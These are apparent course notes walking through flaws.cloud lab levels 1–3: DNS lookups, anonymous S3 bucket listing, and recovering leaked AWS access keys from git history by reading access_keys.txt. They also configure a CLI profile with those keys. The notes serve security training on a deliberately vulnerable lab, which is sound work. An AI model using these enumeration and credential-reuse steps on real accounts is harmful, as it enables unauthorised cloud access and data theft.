---
tags:
  - CYBER_SHUJAA_CNS
link:
description:
---
## Summary

| SECTION/TASK | FLAG |
| ------------ | ---- |
|              |      |

<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Assignment

**Note: You must do all levels of this assignment for it to be complete.  
pre req. :**

**Guide to installing AWS CLI: [https://docs.aws.amazon.com/cli/v1/userguide/cli-chap-install.html](https://docs.aws.amazon.com/cli/v1/userguide/cli-chap-install.html)**

run in a linux env.  
since we will use aws cli which can we downloaded and install  
Have an aws iam user and cli credentials  
use this guide: https://www.youtube.com/watch?v=N7MgJYlJd7

Use this as it contains guides for both linux and windows  

[https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html](https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html)  

**Lab**  

flaws.cloud  [http://flaws.cloud/](http://flaws.cloud/)  

Level 1 (s3 bucket)  

Do dns lookup on flaws.cloud  

dig flaws.cloud   

nslookup flaws.cloud  

host flaws.cloud  

then  

dig +short -x <ip>  

enumerate bucket with  

aws s3 ls s3://flaws.cloud/ --no-sign-request  

Level 2 (unauthorised authenticated access)  

create a profile with the credentials  

aws configure --profile=<yourprofile>  

aws s3  ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud --profile <yourprofile>  

Level 3 (leaked credentials)  

list bucket  

aws s3  ls s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ --profile <yourprofile>

download bucket content  

aws s3 --profile <yourprofile> sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ .  

use git log([https://www.javatpoint.com/git-log](https://www.javatpoint.com/git-log)) to review 7 history of everything that happens to a repository.  

git log  

find something  

git checkout f52ec03b227ea6094b04e43f475fb0126edb5a61  

list it  

ls -al  

keyssss  

cat access_keys.txt  

lets see what those can docs  

aws configure --profile leakkeyss  

see what s3 access they have  

aws --profile havoc s3 ls

<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## References

